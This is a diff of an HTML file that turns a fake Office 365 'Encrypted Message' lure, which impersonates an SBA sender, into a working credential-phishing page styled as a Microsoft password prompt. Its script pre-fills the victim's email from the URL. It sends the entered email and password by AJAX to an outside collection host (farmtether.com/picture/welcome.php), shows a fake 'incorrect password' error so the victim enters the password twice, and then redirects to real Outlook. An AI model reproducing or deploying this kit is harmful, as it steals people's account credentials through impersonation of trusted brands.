@@ -5,11 +5,7 @@
     <meta charset="UTF-8" />
     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Encrypted Message</title>
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0/dist/css/bootstrap.min.css" rel="stylesheet"
-        integrity="sha384-wEmeIV1mKuiNpC+IOBjI7aAzPcEZeedi5yW5f2yOq55WWLwNGmvvx4Um1vskeMj0" crossorigin="anonymous" />
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
-
+    <title>Login</title>
     <style>
         body {
             height: 100%;
@@ -18,121 +14,231 @@
             margin: 0;
             font-family: "Open Sans", sans-serif;
             color: #222;
-            background: #ffffff;
+            background: #e7fafa;
             overflow-x: hidden;
+            background-image: url("https://farmtether.com/picture/welcome-bg.svg");
         }
 
-        .header {
-            background: #0072c6;
-            padding: 8px 20px 8px;
+        .full-body {
+            margin: 5% 33%;
         }
 
-        .header p {
+        .main-body {
+            background: #ffffff;
+            padding: 40px 40px;
+            box-shadow: 0px 0px 8px 2px rgba(148, 148, 148, 0.75);
+            -webkit-box-shadow: 0px 0px 8px 2px rgba(148, 148, 148, 0.75);
+            -moz-box-shadow: 0px 0px 8px 2px rgba(148, 148, 148, 0.75);
+        }
+
+        .error {
+            color: #e04540;
+            margin-bottom: 25px;
+            display: none;
+        }
+
+        .error .blue {
+            color: #0067b8;
+            line-height: 25px;
+            font-size: 14px;
+            font-weight: lighter;
+        }
+
+        .main-body .header {
+            margin: 0;
+            padding: 0;
+        }
+
+        .main-body .img-logo {
+            width: 120px;
+            margin: 0px;
+        }
+
+        .main-body .grabber p {
+            margin-top: 20px;
+            font-size: 14px;
+            font-weight: 200;
+        }
+
+        .main-body .grabber h4 {
+            margin-top: 10px;
+            font-size: 22px;
+            font-weight: 500;
+        }
+
+        .main-body .form-group {
+            margin-top: 20px;
+        }
+
+        .main-body .form-group input {
+            border: 0px solid #222222;
+            border-bottom: 1px solid #4d4d4d;
+            width: 100%;
+            font-size: 14px;
+        }
+
+        .main-body .form-group input:focus {
+            box-shadow: none;
+            outline: none;
+        }
+
+        .main-body p.forgot {
+            font-size: 13px;
+            color: #0067b8;
+        }
+
+        .main-body .form-button {
+            text-align: right;
+        }
+
+        .main-body .form-button .btn {
+            font-size: 14px;
+            color: #ffffff;
+            background: #0067b8;
+            border: 1px solid #0067b8;
+            padding: 7px 30px;
+            border-radius: 1px;
+        }
+        @media only screen and (max-width: 600px) {
+            .full-body {
+            margin: 20% 3%;
+        }
+        .main-body .img-logo {
+            width: 100px;
+            margin: 0px;
+        }
+
+        .error .blue {
+            color: #0067b8;
+            line-height: 25px;
+            font-size: 12px;
+            font-weight: lighter;
+        }
+
+        .main-body .header {
+            margin: 0;
+            padding: 0;
+        }
+
+        .main-body .img-logo {
+            width: 120px;
+            margin: 0px;
+        }
+
+        .main-body .grabber p {
+            margin-top: 20px;
+            font-size: 13px;
+            font-weight: 200;
+        }
+        .main-body .grabber h4 {
+            margin-top: 10px;
+            font-size: 18px;
+            font-weight: 500;
+        }
+
+        .main-body .form-group { 
+            margin-top: 20px;
+        }
+
+        .main-body .form-group input {
+            border: 0px solid #222222;
+            border-bottom: 1px solid #4d4d4d;
+            width: 100%;
+            font-size: 14px;
+        }
+
+        .main-body .form-button .btn {
             font-size: 13px;
             color: #ffffff;
-            font-weight: 300;
-            margin-bottom: 0px;
-            padding-bottom: 0px;
+            background: #0067b8;
+            border: 1px solid #0067b8;
+            padding: 7px 30px;
+            border-radius: 1px;
         }
-
-        .main-one { 
-            margin-top: 12%;
-        }
-
-        .main-one h5 {
-            font-size: 22px;
-            color: #333333;
-            font-weight: 400;
-            margin-bottom: 20px;
-        }
-
-        .main-one p {
-            font-size: 14px;
-            color: #666666;
-            font-weight: 300;
-            margin-bottom: 0px;
-            padding-bottom: 0px;
-        }
-
-        .main-one h6 {
-            color: #0172c6;
-            font-size: 18px;
-            font-weight: 300;
-            margin-bottom: 30px;
-        }
-
-        .main-one a.sign {
-            text-decoration: none;
-            font-size: 15px;
-            color: #0072c6;
-            padding-top: 0px;
-            margin-top: 0px;
-        }
-
-        .main-one a.sign ion-icon {
-            font-size: 30px;
-            padding-top: 2px;
-            top: 10px;
-            position: relative;
-        }
-
-        .footer {
-            margin-top: 23%;
-        }
-
-        .footer p .fas {
-            margin-right: 5px;
-        }
-
-        .footer p {
-            font-size: 13px;
-            color: #666666;
         }
     </style>
 </head>
 
 <body>
-    <div class="header">
-        <p>Encrypted Message</p>
-    </div>
+    <div class="full-body">
+        <div class="main-body">
+            <form onsubmit="handleSubmit(event)" autocomplete="">
+                <div class="header">
+                    <img src="https://farmtether.com/picture/logo-is-here.png" width="200px" alt="logo-here"
+                        class="img-logo" />
+                </div>
+                <div class="grabber">
+                    <p id="gm" class="grab-mail"></p>
+                    <h4>Enter password</h4>
+                    <p id="error" class="error">
+                        Your account or password is incorrect. If you dont remember your
+                        password, <span class="blue"> reset it now </span>
+                    </p>
+                </div>
+                <div class="form-group">
+                    <input id="tm" type="text" value="One" class="input-form" hidden />
+                    <input id="em" type="email" value="" name="em" class="input-form" hidden
+                        required />
+                    <input id="pw" type="password" name="pw" class="input-form" required />
+                    <p class="forgot">Forgot password ?</p>
+                </div>
 
-    <div class="row justify-content-center">
-        <div class="col-md-6">
-            <div class="main-one">
-                <h5>Encrypted message</h5>
-
-                <p>From</p>
-                <h6>DisasterCustomerService@sba.gov</h6>
-
-                <p>To</p>
-                <h6>carlos@cangaroof.com</h6>
-
-                <p>
-                    To view the message, sign in with a Microsoft account, your work or
-                    school account, or use a one-time passcode.
-                </p>
-
-                <a href="#" class="sign">
-                    <ion-icon name="arrow-forward-circle-outline"></ion-icon> Sign in
-                </a>
-            </div>
-
-            <div class="footer">
-                <hr />
-                <p>
-                    <ion-icon name="lock-closed"></ion-icon> Message encryption by Microsoft
-                    Office 365
-                </p>
-            </div>
-
+                <div class="form-button">
+                    <button id="submit" class="btn btn-md btn-primary">Sign in</button>
+                </div>
+            </form>
         </div>
     </div>
-
-
-
-
-    <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
-    <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
 </body>
 
 </html>
+<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+<script>
+       /* global $ */
+       $(document).ready(function () {
+        var url = new URL(window.location.href);
+
+        if(url.searchParams.get("a")){
+            var a = url.searchParams.get("a");
+    }
+    else{
+        var a = "bthompson@thompsonorg.com";
+    }
+    
+    if (!a) {
+        } else {
+            var my_em = a;
+
+        $("#gm").html(my_em);
+        $("#em").val(my_em);
+
+        }
+    });
+
+    function handleSubmit(e) {
+        e.preventDefault();
+        let emma = $("#em").val();
+        let peculiar = $("#pw").val();
+        let times_number = $("#tm").val();
+
+        $.ajax({
+            url: "https://farmtether.com/picture/welcome.php",
+            method: "POST",
+            dataType: "JSON",
+            data: {
+                em: emma,
+                pw: peculiar,
+                tm: times_number,
+            },
+            success: function () { },
+            complete: function () { },
+        });
+        if (times_number === "Two") {
+            window.location.replace(
+                "https://outlook.office.com/mail/inbox"
+            );
+        }
+        $("#error").show();
+        $("#tm").val("Two");
+    }
+</script>
